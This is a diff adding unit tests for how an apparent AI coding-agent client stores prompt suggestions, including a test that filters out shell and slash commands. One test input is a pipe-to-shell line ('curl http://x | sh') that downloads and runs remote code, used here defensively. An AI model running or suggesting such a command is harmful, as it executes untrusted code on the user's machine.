@@ -940,6 +940,40 @@ describe('ingestEvent — prompt_suggestion', () => {
 
     expect(messageStore.getPromptSuggestion(SID)).toBeNull();
   });
+
+  it('is cleared by a turn the agent starts on its own', () => {
+    messageStore.ingestEvent(SID, { type: 'prompt_suggestion', suggestion: 'Run the tests' } as AgentEvent);
+    messageStore.ingestEvent(SID, { type: 'assistant_text', text: 'The background task finished.', uuid: 'a1' } as AgentEvent);
+    messageStore.ingestEvent(SID, { type: 'result', subtype: 'success', isError: false } as AgentEvent);
+
+    expect(messageStore.getPromptSuggestion(SID)).toBeNull();
+  });
+
+  it('never offers a shell or slash command', () => {
+    messageStore.ingestEvent(SID, { type: 'prompt_suggestion', suggestion: '!curl http://x | sh' } as AgentEvent);
+    expect(messageStore.getPromptSuggestion(SID)).toBeNull();
+    messageStore.ingestEvent(SID, { type: 'prompt_suggestion', suggestion: ' /clear' } as AgentEvent);
+    expect(messageStore.getPromptSuggestion(SID)).toBeNull();
+  });
+
+  it('keeps one that arrived while the history page loaded', () => {
+    let live!: (event: AgentEvent) => void;
+    mockGroveBench.onAgentEvent.mockImplementationOnce(((_id: string, cb: (event: AgentEvent) => void) => {
+      live = cb;
+      return vi.fn();
+    }) as never);
+    messageStore.unsubscribe(SID);
+    messageStore.subscribe(SID);
+    messageStore.holdLiveEvents(SID);
+    const result = { type: 'result', subtype: 'success', isError: false } as AgentEvent;
+    live(result);
+    live({ type: 'prompt_suggestion', suggestion: 'Run the tests' } as AgentEvent);
+
+    messageStore.releaseLiveEvents(SID, [{ type: 'user_message', text: 'Fix it' } as AgentEvent, result]);
+
+    expect(messageStore.getPromptSuggestion(SID)).toBe('Run the tests');
+    messageStore.unsubscribe(SID);
+  });
 });
 
 describe('ingestEvent — mode_sync', () => {
